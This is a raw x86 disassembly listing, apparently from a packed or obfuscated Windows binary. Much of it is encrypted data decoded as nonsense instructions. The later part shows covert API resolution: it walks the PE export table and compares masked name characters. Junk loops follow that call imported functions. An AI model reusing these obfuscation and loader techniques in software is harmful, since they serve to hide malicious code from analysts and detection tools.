  40fdab:	clc    
  40fdac:	stos   BYTE PTR es:[edi],al
  40fdad:	jo     0x40fd8f
  40fdaf:	xchg   edx,esi
  40fdb1:	cmp    eax,0x99de52ed
  40fdb6:	jno    0x40fe25
  40fdb8:	test   BYTE PTR gs:[ebp-0x17],dh
  40fdbc:	xor    BYTE PTR [ebp+0x7e6903bf],dl
  40fdc2:	dec    ecx
  40fdc3:	dec    ebp
  40fdc4:	fnsetpm(287 only) 
  40fdc6:	aas    
  40fdc7:	dec    esi
  40fdc8:	mov    bl,0xe9
  40fdca:	xor    bh,BYTE PTR ds:0x86a99412
  40fdd0:	fs or  al,0x18
  40fdd3:	shl    DWORD PTR ds:0xdf50cf1a,1
  40fdd9:	iret   
  40fdda:	fmul   DWORD PTR [esp+ebp*2]
  40fddd:	add    edi,0xffffff95
  40fde0:	add    esi,ebx
  40fde2:	mov    dh,0x26
  40fde4:	jno    0x40fe4a
  40fde6:	jns    0x40fddc
  40fde8:	xchg   DWORD PTR [edi-0x21],esp
  40fdeb:	push   es
  40fdec:	scas   al,BYTE PTR es:[edi]
  40fded:	ins    DWORD PTR es:[edi],dx
  40fdee:	adc    BYTE PTR [esi+0x22],al
  40fdf1:	(bad)  
  40fdf2:	call   0x7f3b:0xc58f4851
  40fdf9:	pushf  
  40fdfa:	pop    ds
  40fdfb:	mov    dh,0xc9
  40fdfd:	repz mov edi,0xb40de157
  40fe03:	fnstenv [eax-0x62]
  40fe06:	mov    dh,0x8d
  40fe08:	mov    ebp,0x42029136
  40fe0d:	cli    
  40fe0e:	ror    BYTE PTR [edx-0x57e724a3],0x5c
  40fe15:	jle    0x40fe0e
  40fe17:	aas    
  40fe18:	hlt    
  40fe19:	popa   
  40fe1a:	sbb    al,0x9a
  40fe1c:	cli    
  40fe1d:	pop    ds
  40fe1e:	adc    al,0x3e
  40fe20:	nop
  40fe21:	outs   dx,DWORD PTR ds:[esi]
  40fe22:	adc    BYTE PTR [eax-0x2],0x7b
  40fe26:	cmp    ch,dl
  40fe28:	jge    0x40fe92
  40fe2a:	xlat   BYTE PTR ds:[ebx]
  40fe2b:	lods   eax,DWORD PTR ds:[esi]
  40fe2c:	or     edi,ecx
  40fe2e:	pop    edi
  40fe2f:	lea    ebx,[eax-0x6bf4f1b8]
  40fe35:	cmp    ch,BYTE PTR [ebx]
  40fe37:	gs cmp al,0xc7
  40fe3a:	and    eax,edi
  40fe3c:	shr    BYTE PTR [edx+eiz*1-0x32],cl
  40fe40:	out    dx,al
  40fe41:	xor    al,0xa1
  40fe43:	imul   ebx,DWORD PTR [eax+0x46178992],0x7a7202e8
  40fe4d:	mov    edi,0x721d58a5
  40fe52:	mov    ds:0xddabf2f1,al
  40fe57:	xchg   esp,eax
  40fe58:	jnp    0x40feca
  40fe5a:	jb     0x40fe7f
  40fe5c:	ret    
  40fe5d:	mov    eax,ds:0xe200fdbe
  40fe62:	mov    al,ds:0x35389abb
  40fe67:	cld    
  40fe68:	or     eax,0x64fef185
  40fe6d:	ret    0xc25d
  40fe70:	add    edi,edx
  40fe72:	jle    0x40fee5
  40fe74:	mov    edi,0x4e0be192
  40fe79:	cmp    BYTE PTR [ebp-0x7a],bl
  40fe7c:	iret   
  40fe7d:	jnp    0x40fe4e
  40fe7f:	xchg   esi,eax
  40fe80:	ins    BYTE PTR es:[edi],dx
  40fe81:	or     al,0x93
  40fe83:	pop    ebx
  40fe84:	out    dx,eax
  40fe85:	scas   al,BYTE PTR es:[edi]
  40fe86:	jo     0x40ff03
  40fe88:	xchg   edx,eax
  40fe89:	xor    eax,0xdccdd13d
  40fe8e:	test   eax,0xab8b53ce
  40fe93:	mov    WORD PTR [edx],?
  40fe95:	mov    BYTE PTR [edi+edx*2-0xe4d5a8f],ah
  40fe9c:	mov    al,ds:0x7141dde8
  40fea1:	out    dx,al
  40fea2:	pop    ecx
  40fea3:	int3   
  40fea4:	je     0x40ff17
  40fea6:	push   ebx
  40fea7:	stos   DWORD PTR es:[edi],eax
  40fea8:	dec    esp
  40fea9:	mov    ?,WORD PTR [edi+0x16]
  40feac:	push   edi
  40fead:	xor    eax,0xec9e103d
  40feb2:	fisubr WORD PTR [eax+0x73e69195]
  40feb8:	clc    
  40feb9:	ins    BYTE PTR es:[edi],dx
  40feba:	cmp    DWORD PTR [esi+0x7c2defa9],esi
  40fec0:	fdiv   DWORD PTR [eax]
  40fec2:	sahf   
  40fec3:	inc    esi
  40fec4:	mov    eax,ds:0xaa0b6d02
  40fec9:	xlat   BYTE PTR ds:[ebx]
  40feca:	inc    edx
  40fecb:	in     eax,0xc4
  40fecd:	xchg   edx,eax
  40fece:	bound  ecx,QWORD PTR [edi]
  40fed0:	jmp    0x40fe64
  40fed2:	fistp  QWORD PTR [edi+0x71273dfd]
  40fed8:	fcom   DWORD PTR [edi+0x1b]
  40fedb:	push   DWORD PTR [ebx]
  40fedd:	sbb    al,0x28
  40fedf:	repnz mov edi,0x605aea50
  40fee5:	or     DWORD PTR [ecx],esi
  40fee7:	or     ch,BYTE PTR [ecx+ecx*2+0x5]
  40feeb:	push   0x7ba794f3
  40fef0:	sahf   
  40fef1:	pop    esp
  40fef2:	mov    ah,BYTE PTR [ecx+0x519b0ce2]
  40fef8:	xor    BYTE PTR [ebp-0x22],0xc1
  40fefc:	pop    ebx
  40fefd:	gs test cl,0x52
  40ff01:	xchg   edi,eax
  40ff02:	dec    esp
  40ff03:	aas    
  40ff04:	push   cs
  40ff05:	push   0xae1aa7d3
  40ff0a:	pop    ss
  40ff0b:	stos   BYTE PTR es:[edi],al
  40ff0c:	pushf  
  40ff0d:	int3   
  40ff0e:	retf   
  40ff0f:	or     ebx,DWORD PTR [eax]
  40ff11:	and    al,0x70
  40ff13:	in     al,dx
  40ff14:	sub    edx,DWORD PTR [esi]
  40ff16:	out    0x5,eax
  40ff18:	leave  
  40ff19:	js     0x40ff3c
  40ff1b:	pusha  
  40ff1c:	jmp    0x40ff0c
  40ff1e:	mov    dh,0x20
  40ff20:	js     0x40fec4
  40ff22:	shl    al,0x5a
  40ff25:	push   ebp
  40ff26:	mov    esi,0xe2236b9
  40ff2b:	mov    ch,0xab
  40ff2d:	or     edi,DWORD PTR [ebp+0x2d]
  40ff30:	jb     0x40ffaa
  40ff32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff33:	mov    dh,0x9a
  40ff35:	sti    
  40ff36:	jb     0x40ff45
  40ff38:	jge    0x40ff10
  40ff3a:	enter  0xfd64,0xb4
  40ff3e:	jb     0x40fefe
  40ff40:	push   ebp
  40ff41:	jl     0x40ff1c
  40ff43:	dec    eax
  40ff44:	sub    BYTE PTR [ebp-0x62c1d106],ah
  40ff4a:	add    DWORD PTR [ebx+ebx*1+0x66d914a1],0xffffffcf
  40ff52:	(bad)  
  40ff53:	mov    ebp,?
  40ff55:	sti    
  40ff56:	xlat   BYTE PTR gs:[ebx]
  40ff58:	push   ds
  40ff59:	mov    WORD PTR [edx+0x1637e8f2],?
  40ff5f:	repnz test edx,edi
  40ff62:	pop    ss
  40ff63:	enter  0x5cc2,0x4d
  40ff67:	std    
  40ff68:	lahf   
  40ff69:	add    BYTE PTR [ecx+0x50dacfca],dh
  40ff6f:	loop   0x40ff59
  40ff71:	jne    0x40ff15
  40ff73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff74:	jno    0x40ffed
  40ff76:	push   eax
  40ff77:	xor    DWORD PTR [edx+0x77],esp
  40ff7a:	mov    ds:0x39f638c6,eax
  40ff7f:	cdq    
  40ff80:	sti    
  40ff81:	inc    ecx
  40ff82:	fwait
  40ff83:	dec    esi
  40ff84:	jo     0x40ffe3
  40ff86:	sub    DWORD PTR [esp+eiz*2-0x45986473],ebx
  40ff8d:	jb     0x40fff6
  40ff8f:	sbb    al,0x4b
  40ff91:	jbe    0x40ffb0
  40ff93:	and    bh,bh
  40ff95:	jg     0x410015
  40ff97:	rcr    DWORD PTR [edi-0x40],1
  40ff9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff9b:	lea    ebp,[ebx-0x528a8352]
  40ffa1:	cmp    DWORD PTR [edi+eiz*2-0x4ad05af0],ebx
  40ffa8:	add    BYTE PTR [ebp+0x48],0x96
  40ffac:	loope  0x40ffe7
  40ffae:	cmc    
  40ffaf:	jge    0x40ff8f
  40ffb1:	lea    edi,[ecx]
  40ffb3:	or     al,0x88
  40ffb5:	pop    DWORD PTR [ecx-0x3ba417e2]
  40ffbb:	sbb    al,0x7c
  40ffbd:	mov    esi,0xf15779e3
  40ffc2:	mov    al,ds:0x9f6e330f
  40ffc7:	xchg   esp,eax
  40ffc8:	pop    edi
  40ffc9:	jnp    0x40ff64
  40ffcb:	(bad)  
  40ffcc:	cli    
  40ffcd:	daa    
  40ffce:	pop    ss
  40ffcf:	jmp    0x7771:0xdced9f5b
  40ffd6:	fcomp  st(1)
  40ffd8:	jne    0x40fff2
  40ffda:	lods   al,BYTE PTR ds:[esi]
  40ffdb:	xchg   ebx,eax
  40ffdc:	xor    eax,0x6f711ab7
  40ffe1:	inc    eax
  40ffe2:	lods   eax,DWORD PTR ds:[esi]
  40ffe3:	xor    BYTE PTR [edx-0x6a9c7db0],al
  40ffe9:	adc    ecx,DWORD PTR [ebx]
  40ffeb:	mov    dh,0x55
  40ffed:	cmp    bl,BYTE PTR [ebx-0x1ef4e59]
  40fff3:	out    0xd9,eax
  40fff5:	or     bl,BYTE PTR [eax-0x2]
  40fff8:	adc    BYTE PTR [ebx+0x50],cl
  40fffb:	int3   
  40fffc:	sar    BYTE PTR [eax-0x2f],0xb9
  410000:	or     BYTE PTR [edi+eax*2+0x6e],bh
  410004:	jecxz  0x410032
  410006:	dec    edi
  410007:	sub    BYTE PTR [eax],bh
  410009:	test   al,0x96
  41000b:	inc    edx
  41000c:	test   eax,esi
  41000e:	mov    BYTE PTR [ebx-0x6b],ch
  410011:	inc    ebp
  410012:	ret    
  410013:	arpl   WORD PTR [ebx+0x7a1de335],bp
  410019:	mov    eax,0x35f7e5ea
  41001e:	mov    ah,0xcc
  410020:	or     eax,0x73d91ee7
  410025:	push   edx
  410026:	push   ds
  410027:	dec    ebp
  410028:	ins    BYTE PTR es:[edi],dx
  410029:	and    al,0x83
  41002b:	or     al,0x8f
  41002d:	sbb    al,0xb0
  41002f:	sbb    BYTE PTR [edi-0x1a],al
  410032:	dec    ebp
  410033:	scas   eax,DWORD PTR es:[edi]
  410034:	arpl   WORD PTR [esi],cx
  410036:	lahf   
  410037:	loop   0x40fff8
  410039:	es shl dh,cl
  41003c:	mov    edx,0x3071dabb
  410041:	mov    WORD PTR [edx-0x2],fs
  410044:	out    0x56,al
  410046:	mov    ecx,0xfafed8e5
  41004b:	pop    ss
  41004c:	(bad)  
  41004d:	pop    esi
  41004e:	inc    edx
  41004f:	aam    0xdf
  410051:	push   esp
  410052:	in     eax,0x30
  410054:	mov    ds:0xa67256ac,eax
  410059:	and    ebp,DWORD PTR [eax+0x51b17da1]
  41005f:	icebp  
  410060:	mov    BYTE PTR [ecx+eax*1],ch
  410063:	jge    0x41001c
  410065:	sbb    ebp,DWORD PTR [ecx]
  410067:	popa   
  410068:	xchg   dh,dl
  41006a:	mov    eax,0x7b6eefd8
  41006f:	xor    eax,0xc6eebd0f
  410074:	mov    ebp,DWORD PTR [ebx]
  410076:	loope  0x410025
  410078:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410079:	sub    DWORD PTR [ebx+0x49],ebp
  41007c:	and    BYTE PTR [ecx+edx*1-0x20],bh
  410080:	ret    0x90bf
  410083:	fld1   
  410085:	fsubr  st,st(6)
  410087:	dec    edx
  410088:	lock loope 0x410058
  41008b:	ins    BYTE PTR es:[edi],dx
  41008c:	jae    0x410053
  41008e:	leave  
  41008f:	inc    esi
  410090:	mov    BYTE PTR [esi-0x1575b83f],cl
  410096:	cli    
  410097:	mov    esi,0xfc6864bd
  41009c:	rep stos BYTE PTR es:[edi],al
  41009e:	pop    ebp
  41009f:	pop    edi
  4100a0:	pop    ss
  4100a1:	dec    eax
  4100a2:	test   DWORD PTR [eax+0x524e9c56],eax
  4100a8:	xchg   DWORD PTR [edx+0x344c08a],edi
  4100ae:	mov    DWORD PTR [esp+esi*2+0x18],esi
  4100b2:	mov    ah,0x2
  4100b4:	mov    ebx,cs
  4100b6:	cmp    eax,0x2095c41f
  4100bb:	js     0x41012f
  4100bd:	xchg   ebp,eax
  4100be:	xor    eax,0x32e43c38
  4100c3:	inc    ebx
  4100c4:	aad    0x1e
  4100c6:	xchg   esp,eax
  4100c7:	pop    ecx
  4100c8:	shl    cl,cl
  4100ca:	xlat   BYTE PTR ds:[ebx]
  4100cb:	in     al,dx
  4100cc:	cs out dx,eax
  4100ce:	and    DWORD PTR [edx+0x49ae5ebb],esp
  4100d4:	out    0xdc,al
  4100d6:	fnsave ds:0xce2099ba
  4100dc:	test   eax,0xa9068b83
  4100e1:	sub    al,0x53
  4100e3:	js     0x4100e7
  4100e5:	test   DWORD PTR [eax],eax
  4100e7:	sub    al,0x7f
  4100e9:	sub    al,0x52
  4100eb:	adc    BYTE PTR [ebx-0x31],cl
  4100ee:	xchg   edi,eax
  4100ef:	cmp    al,0xa0
  4100f1:	int    0xbd
  4100f3:	mov    edi,0xad28fcf7
  4100f8:	or     BYTE PTR [ebp+0x2afc13f4],dh
  4100fe:	xor    eax,DWORD PTR [ebp-0x2e]
  410101:	adc    ch,BYTE PTR [edi]
  410103:	cmp    DWORD PTR [edi+0x79],esp
  410106:	enter  0xf255,0x69
  41010a:	sbb    DWORD PTR [edi],edx
  41010c:	push   cs
  41010d:	xchg   BYTE PTR [ebp+0x4320972c],ch
  410113:	cmp    ebp,DWORD PTR [ebx-0x3a]
  410116:	sbb    al,0x85
  410118:	dec    edi
  410119:	dec    eax
  41011a:	mov    esi,0x7e6c2f02
  41011f:	mov    edi,0x929dcb94
  410124:	out    dx,al
  410125:	xor    dl,al
  410127:	out    0xae,al
  410129:	jmp    0x86f5:0xc24ceaed
  410130:	gs mov dh,0x5
  410133:	ins    BYTE PTR es:[edi],dx
  410134:	xor    BYTE PTR [edi-0x5],ah
  410137:	outs   dx,BYTE PTR ds:[esi]
  410138:	js     0x410106
  41013a:	sar    ch,cl
  41013c:	addr16 aad 0x60
  41013f:	xor    al,0x4e
  410141:	fldenv ds:0x7ed52bb
  410147:	xchg   edi,eax
  410148:	sbb    al,0xd5
  41014a:	inc    edx
  41014b:	sti    
  41014c:	nop
  41014d:	xor    al,0x12
  41014f:	mov    ebp,0x26e3fae6
  410154:	push   cs
  410155:	inc    edi
  410156:	aad    0x90
  410158:	cs (bad) 
  41015b:	inc    ebx
  41015c:	gs jp  0x41012e
  41015f:	mov    esp,0xd9d6deec
  410164:	(bad)  [ebx]
  410166:	js     0x41011b
  410168:	push   edi
  410169:	mov    edi,0xa9d93d3c
  41016e:	out    dx,al
  41016f:	jmp    0x73d7f7c7
  410174:	cmp    al,0x7c
  410176:	es leave 
  410178:	pop    ecx
  410179:	push   cs
  41017a:	add    ecx,DWORD PTR [edi-0x2fb5c968]
  410180:	lea    ecx,[edx+eax*4-0x64]
  410184:	jbe    0x410117
  410186:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410187:	imul   esp,DWORD PTR [eax-0x1b7c658f],0x7715b297
  410191:	call   0x1f2b:0xafbd224b
  410198:	pop    ss
  410199:	dec    esp
  41019a:	ror    dh,0xdf
  41019d:	pop    esi
  41019e:	or     cl,bh
  4101a0:	jle    0x410139
  4101a2:	jo     0x4101a3
  4101a4:	loope  0x4101ed
  4101a6:	ficomp WORD PTR cs:[edx]
  4101a9:	jg     0x41020d
  4101ab:	mul    BYTE PTR [ebp+0x591adc79]
  4101b1:	push   ecx
  4101b2:	loopne 0x4101a0
  4101b4:	mov    ah,BYTE PTR [edx+0x6424e6af]
  4101ba:	mov    DWORD PTR [esi-0x4f],ebp
  4101bd:	and    DWORD PTR [ebp+0x60f800a],esi
  4101c3:	loop   0x4101a1
  4101c5:	add    BYTE PTR [ecx],ah
  4101c7:	scas   eax,DWORD PTR es:[edi]
  4101c8:	punpckhwd mm4,QWORD PTR [ebx+edx*1+0x770a734b]
  4101d0:	add    eax,0x64f5dbe
  4101d5:	sub    esi,DWORD PTR [ebx+0x74]
  4101d8:	dec    edi
  4101d9:	mov    al,BYTE PTR [edx+0xf]
  4101dc:	pop    edi
  4101dd:	sub    DWORD PTR [ecx+0x6b0e6676],ebx
  4101e3:	xchg   edx,eax
  4101e4:	jno    0x410249
  4101e6:	das    
  4101e7:	arpl   dx,ax
  4101e9:	push   edx
  4101ea:	sub    eax,0x13b86ba9
  4101ef:	fadd   QWORD PTR [esi+0x23d7c8f0]
  4101f5:	test   al,0xcc
  4101f7:	or     DWORD PTR [esi],0x70f4083
  4101fd:	pop    es
  4101fe:	inc    ecx
  4101ff:	je     0x410278
  410201:	aad    0x28
  410203:	fwait
  410204:	or     BYTE PTR [eax-0x7142f392],dh
  41020a:	scas   eax,DWORD PTR es:[edi]
  41020b:	xchg   edi,eax
  41020c:	mov    DWORD PTR [ecx],ebx
  41020e:	cdq    
  41020f:	push   ebx
  410210:	das    
  410211:	leave  
  410212:	cmc    
  410213:	mov    edx,0xee3f20b7
  410218:	cmp    al,0x64
  41021a:	push   cs
  41021b:	mov    ebx,0x6bc03c8b
  410220:	push   esp
  410221:	loope  0x410244
  410223:	arpl   WORD PTR [esi],bx
  410225:	or     al,0x7a
  410227:	or     DWORD PTR [eax-0xfe83f7],ecx
  41022d:	les    ebp,FWORD PTR [ebx+eax*4-0xcc97ebc]
  410234:	fild   WORD PTR [edx+edx*4-0x42bd1a5f]
  41023b:	pop    edx
  41023c:	(bad)  
  41023d:	mov    ds:0xf044b587,al
  410242:	or     DWORD PTR [ecx-0x1196d953],eax
  410248:	jnp    0x4102c7
  41024a:	sbb    al,0x12
  41024c:	xchg   esp,eax
  41024d:	aas    
  41024e:	cmp    DWORD PTR [ecx-0x4a],ebp
  410251:	pop    esp
  410252:	stos   DWORD PTR es:[edi],eax
  410253:	dec    ecx
  410254:	out    0xbb,eax
  410256:	sar    DWORD PTR [ecx-0x45],1
  410259:	inc    esi
  41025a:	mov    ds:0x4c23e895,eax
  41025f:	int3   
  410260:	hlt    
  410261:	mov    WORD PTR [esi-0x74],ds
  410264:	ret    0x7e59
  410267:	arpl   WORD PTR [edx+0x3a7c1644],di
  41026d:	mov    cl,BYTE PTR [eax]
  41026f:	loop   0x4102a6
  410271:	stc    
  410272:	cmp    DWORD PTR [edx],edi
  410274:	mov    ebx,0x19cc4a8c
  410279:	test   al,0xe8
  41027b:	inc    BYTE PTR [edi+0x7e3ae0b7]
  410281:	lds    ebx,FWORD PTR [eax+ecx*8+0x5e]
  410285:	sbb    cl,dh
  410287:	push   edi
  410288:	outs   dx,BYTE PTR ds:[esi]
  410289:	adc    ch,cl
  41028b:	dec    edi
  41028c:	xchg   edi,eax
  41028d:	push   ss
  41028e:	inc    esi
  41028f:	inc    edx
  410290:	push   esi
  410291:	jg     0x4102cc
  410293:	aam    0x6
  410295:	sbb    al,0x38
  410297:	jns    0x4102c2
  410299:	cld    
  41029a:	out    dx,al
  41029b:	add    eax,0xef575acc
  4102a0:	pop    ds
  4102a1:	pop    esp
  4102a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102a3:	iret   
  4102a4:	cli    
  4102a5:	or     esp,ebx
  4102a7:	push   eax
  4102a8:	adc    edi,DWORD PTR [edx]
  4102aa:	xlat   BYTE PTR ds:[ebx]
  4102ab:	lea    esi,[esi]
  4102ad:	sbb    eax,0x715665eb
  4102b2:	push   esp
  4102b3:	(bad)  
  4102b4:	in     al,dx
  4102b5:	shl    DWORD PTR [ecx+0x48a29a30],0xb4
  4102bc:	sub    al,0x77
  4102be:	add    BYTE PTR [edi+0x7e],bl
  4102c1:	inc    ebx
  4102c2:	pushf  
  4102c3:	ror    DWORD PTR [ebx-0x18],0x47
  4102c7:	in     eax,dx
  4102c8:	and    BYTE PTR [esi+edi*2+0x6c],ch
  4102cc:	repz push esi
  4102ce:	cmp    BYTE PTR [edi-0x2c],cl
  4102d1:	sub    eax,0xffaf845f
  4102d6:	call   0x8999:0x4ca49f89
  4102dd:	addr16 in eax,0xea
  4102e0:	hlt    
  4102e1:	push   cs
  4102e2:	or     DWORD PTR [ebp-0x411fbf49],0xf4ee8f94
  4102ec:	dec    eax
  4102ed:	loop   0x4102e5
  4102ef:	mov    dh,0x2
  4102f1:	xor    BYTE PTR [eax],ah
  4102f3:	or     BYTE PTR [edi-0x3feb5f46],dh
  4102f9:	xchg   BYTE PTR [ebx],cl
  4102fb:	add    eax,DWORD PTR [esi+0x51]
  4102fe:	or     al,0xd4
  410300:	xor    edi,DWORD PTR [eax+ebp*2]
  410303:	adc    al,0xa3
  410305:	inc    DWORD PTR [edi]
  410307:	xchg   ebx,eax
  410308:	mov    ebp,0xdabee3a8
  41030d:	fbstp  TBYTE PTR [ebx+0x23]
  410310:	sbb    cl,al
  410312:	popa   
  410313:	addr16 dec ecx
  410315:	mov    edi,DWORD PTR [edx-0x47]
  410318:	push   ebx
  410319:	jl     0x4102c0
  41031b:	dec    esp
  41031c:	push   ds
  41031d:	and    DWORD PTR [edi+0x61ca6191],0x7127476a
  410327:	adc    al,bl
  410329:	test   BYTE PTR [ecx+0x46370d72],ch
  41032f:	adc    BYTE PTR [edi-0x604e4970],ch
  410335:	sub    ah,BYTE PTR [ecx]
  410337:	pop    esp
  410338:	lods   eax,DWORD PTR ds:[esi]
  410339:	js     0x4102ef
  41033b:	mov    dl,0xa9
  41033d:	dec    eax
  41033e:	mov    bh,0x9d
  410340:	loope  0x4103ac
  410342:	xor    al,0x17
  410344:	rcr    BYTE PTR [eax],1
  410346:	mov    ecx,0x3d484aff
  41034b:	lea    edx,[ecx-0x8]
  41034e:	adc    eax,DWORD PTR [ebx-0x25]
  410351:	jns    0x4102f6
  410353:	inc    edx
  410354:	lahf   
  410355:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410356:	mov    bl,0x19
  410358:	jp     0x410338
  41035a:	stos   DWORD PTR es:[edi],eax
  41035b:	jne    0x4103b2
  41035d:	pop    eax
  41035e:	inc    esi
  41035f:	aas    
  410360:	rcr    BYTE PTR [eax-0x11b51203],0xc0
  410367:	cmp    al,0xfc
  410369:	js     0x4103b7
  41036b:	nop
  41036c:	jne    0x410329
  41036e:	dec    ebx
  41036f:	cmp    eax,DWORD PTR [eax]
  410371:	add    BYTE PTR [esi+0x2b],ah
  410374:	sti    
  410375:	mov    ebx,0x8a85
  41037a:	xor    di,bx
  41037d:	mov    ebx,0x4f8a
  410382:	cmp    di,bx
  410385:	jne    0x4103ad
  41038b:	movsx  di,BYTE PTR [eax]
  41038f:	mov    ebx,0x3b4b
  410394:	sub    di,bx
  410397:	mov    ebx,0x8a85
  41039c:	xor    di,bx
  41039f:	mov    ebx,0x4f87
  4103a4:	cmp    di,bx
  4103a7:	je     0x4103bd
  4103ad:	mov    edi,DWORD PTR [ebp-0x10]
  4103b0:	xor    edi,ecx
  4103b2:	mov    ebx,esi
  4103b4:	sub    ebx,edi
  4103b6:	add    eax,ebx
  4103b8:	jmp    0x40dfbd
  4103bd:	mov    esi,DWORD PTR [ebp-0x14]
  4103c0:	mov    esi,DWORD PTR [esi]
  4103c2:	mov    edi,DWORD PTR [eax+0x3c]
  4103c5:	lea    esi,[edi+esi*8+0x78]
  4103c9:	mov    esi,DWORD PTR [esi+eax*1]
  4103cc:	mov    DWORD PTR [ebp-0x8],esi
  4103cf:	mov    esi,DWORD PTR [ebp+0x8]
  4103d2:	xor    esi,ecx
  4103d4:	add    esi,edx
  4103d6:	mov    DWORD PTR [ebp-0x14],esi
  4103d9:	mov    esi,DWORD PTR [ebp+0x8]
  4103dc:	mov    edi,DWORD PTR [ebp-0x8]
  4103df:	xor    esi,ecx
  4103e1:	add    esi,edx
  4103e3:	pop    ebx
  4103e4:	cmp    edi,esi
  4103e6:	jne    0x410404
  4103ec:	mov    eax,DWORD PTR [ebp+0xc]
  4103ef:	xor    eax,ecx
  4103f1:	mov    ecx,DWORD PTR [ebp-0x8]
  4103f4:	add    eax,edx
  4103f6:	imul   eax,ecx
  4103f9:	mov    DWORD PTR [ebp-0x8],eax
  4103fc:	push   DWORD PTR [ebp+0x18]
  4103ff:	jmp    0x410458
  410404:	mov    ecx,DWORD PTR [ebp-0x8]
  410407:	add    ecx,eax
  410409:	mov    DWORD PTR [ebp-0x14],ecx
  41040c:	mov    ecx,DWORD PTR [ebp-0x14]
  41040f:	mov    ecx,DWORD PTR [ecx+0xc]
  410412:	movsx  cx,BYTE PTR [ecx+eax*1]
  410417:	mov    edx,0x3b4b
  41041c:	sub    cx,dx
  41041f:	mov    edx,0x8a85
  410424:	xor    cx,dx
  410427:	mov    edx,0x4f85
  41042c:	cmp    cx,dx
  41042f:	jne    0x4103fc
  410435:	mov    ecx,DWORD PTR ds:0x41d45c
  41043b:	mov    ecx,DWORD PTR [ecx+0x198]
  410441:	mov    DWORD PTR [ecx],eax
  410443:	jmp    0x410469
  410448:	mov    ecx,DWORD PTR [ebp+0x18]
  41044b:	cmp    ecx,0xf89c85b5
  410451:	jne    0x410469
  410457:	push   eax
  410458:	push   DWORD PTR [ebp+0x14]
  41045b:	push   DWORD PTR [ebp+0x10]
  41045e:	push   DWORD PTR [ebp+0xc]
  410461:	push   DWORD PTR [ebp+0x8]
  410464:	call   0x40b7a6
  410469:	pop    edi
  41046a:	pop    esi
  41046b:	leave  
  41046c:	ret    0x14
  41046f:	push   ebp
  410470:	mov    ebp,esp
  410472:	sub    esp,0x48
  410475:	and    DWORD PTR ds:0x427018,0x0
  41047f:	mov    eax,ds:0x427018
  410484:	inc    eax
  410485:	mov    ds:0x427018,eax
  41048a:	cmp    DWORD PTR ds:0x427018,0xc
  410491:	jne    0x4104a6
  410497:	push   DWORD PTR [ebp-0xc]
  41049a:	push   DWORD PTR [ebp-0xc]
  41049d:	push   DWORD PTR [ebp-0x28]
  4104a0:	call   DWORD PTR ds:0x421028
  4104a6:	cmp    DWORD PTR ds:0x427018,0xb
  4104ad:	jne    0x4104be
  4104b3:	mov    eax,ds:0x427018
  4104b8:	inc    eax
  4104b9:	mov    ds:0x427018,eax
  4104be:	cmp    DWORD PTR ds:0x427018,0x1f
  4104c5:	jb     0x41047f
  4104cb:	adc    DWORD PTR ds:0x428010,ebx
  4104d1:	push   ebx
  4104d2:	mov    DWORD PTR ds:0x426010,0x1e
  4104dc:	cmp    DWORD PTR ds:0x426010,0x0
  4104e3:	je     0x410526
  4104e9:	cmp    DWORD PTR ds:0x426010,0x26
  4104f0:	jne    0x410501
  4104f6:	push   0x41ff32
  4104fb:	call   DWORD PTR ds:0x42102c
  410501:	xor    eax,eax
  410503:	xor    eax,DWORD PTR ds:0x426010
  410509:	dec    eax
  41050a:	mov    ds:0x426010,eax
  41050f:	jmp    0x4104dc
  410514:	movzx  eax,WORD PTR ds:0x427014
  41051b:	sub    eax,DWORD PTR ds:0x426004
  410521:	mov    ds:0x427014,eax
  410526:	push   esi
  410527:	push   edi
  410528:	and    DWORD PTR ds:0x428000,0x0
  410532:	jmp    0x410544
  410537:	mov    edi,DWORD PTR ds:0x428000
  41053d:	inc    edi
  41053e:	mov    DWORD PTR ds:0x428000,edi
  410544:	cmp    DWORD PTR ds:0x428000,0x1e
  41054b:	jae    0x410597
  410551:	cmp    DWORD PTR ds:0x428000,0x1f
  410558:	jne    0x41058c
  41055e:	push   DWORD PTR [ebp-0x28]
  410561:	push   0x3d00
  410566:	push   0x5480
  41056b:	push   DWORD PTR [ebp-0x10]
  41056e:	push   DWORD PTR [ebp-0x24]
  410571:	push   DWORD PTR [ebp-0x1c]
  410574:	push   0x6187
  410579:	push   DWORD PTR [ebp-0x20]
  41057c:	push   0x5fd8
  410581:	push   0x12ef
  410586:	call   DWORD PTR ds:0x421030
  41058c:	jmp    0x410537
  410591:	and    eax,DWORD PTR ds:0x426018
  410597:	xor    esi,esi
  410599:	and    DWORD PTR ds:0x428008,0x0
  4105a3:	jmp    0x4105b5
  4105a8:	mov    edi,DWORD PTR ds:0x428008
  4105ae:	inc    edi
  4105af:	mov    DWORD PTR ds:0x428008,edi
  4105b5:	cmp    DWORD PTR ds:0x428008,0x1e
  4105bc:	jae    0x4105ff
  4105c2:	cmp    DWORD PTR ds:0x428008,0xe
  4105c9:	jne    0x4105e0
  4105cf:	push   DWORD PTR [ebp-0x18]
  4105d2:	push   0x425020
  4105d7:	push   DWORD PTR [ebp-0x28]
  4105da:	call   DWORD PTR ds:0x421034
  4105e0:	cmp    DWORD PTR ds:0x428008,0xd
  4105e7:	jne    0x4105fa
  4105ed:	mov    edi,DWORD PTR ds:0x428008
  4105f3:	inc    edi
  4105f4:	mov    DWORD PTR ds:0x428008,edi
  4105fa:	jmp    0x4105a8
  4105ff:	mov    DWORD PTR [ebp-0x20],esi
  410602:	or     eax,edi
  410604:	mov    eax,DWORD PTR [ebp-0xc]
  410607:	push   0x21
  410609:	and    DWORD PTR ds:0x429004,edi
  41060f:	mov    DWORD PTR [ebp-0xc],eax
  410612:	add    edi,DWORD PTR ds:0x425020
  410618:	pop    edi
  410619:	add    DWORD PTR ds:0x425010,0x428010
  410623:	push   0x41d570
  410628:	call   DWORD PTR ds:0x421040
  41062e:	push   esi
  41062f:	and    DWORD PTR ds:0x425008,0x428018
  410639:	push   0x2
  41063b:	adc    DWORD PTR ds:0x425018,0x428008
  410645:	push   0x1
  410647:	xor    DWORD PTR ds:0x429004,0x425020
  410651:	push   0x2
  410653:	push   0x1
